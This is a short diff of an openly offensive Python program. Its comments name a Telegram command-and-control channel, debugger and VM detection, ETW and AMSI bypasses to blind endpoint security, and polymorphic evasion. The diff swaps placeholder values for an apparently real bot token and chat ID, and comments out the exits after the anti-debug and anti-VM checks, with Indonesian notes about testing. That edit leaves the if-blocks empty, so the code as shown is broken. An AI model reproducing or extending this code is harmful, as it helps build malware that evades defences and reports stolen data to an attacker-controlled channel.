@@ -18,8 +18,9 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 
 # Telegram C2
-TELEGRAM_TOKEN = "YOUR_BOT_TOKEN_HERE"
-CHAT_ID = "YOUR_CHAT_ID_HERE"
+
+TELEGRAM_TOKEN = "8210714938:AAHAbovQzWwlr8ZRTGyBvAwCh4QOArFILY4"  # Ganti dengan bot token Anda
+CHAT_ID = "5457823680"
 
 # ═══════════════════ ANTI-DEBUGGING SUITE (5-LAYER PROTECTION) ═══════════════════
 def anti_debug_suite():
@@ -245,11 +246,11 @@ if __name__ == "__main__":
     etw_ghost_bypass()          # EDR blind
     amsi_bypass()              # Script scanner OFF
     if not anti_debug_suite():  # DEBUGGER CHECK ← NEW!
-        sys.exit(0)
+        # sys.exit(0) #aktifkan jika tidak sedang pengujian
     polymorphic_init()         # AI evasion
     time.sleep(random.randint(15, 45))
 
     if anti_vm_complete():
-        sys.exit(0)
+       # sys.exit(0) #aktifkan jika tidak sedang pengujian
 
     main()
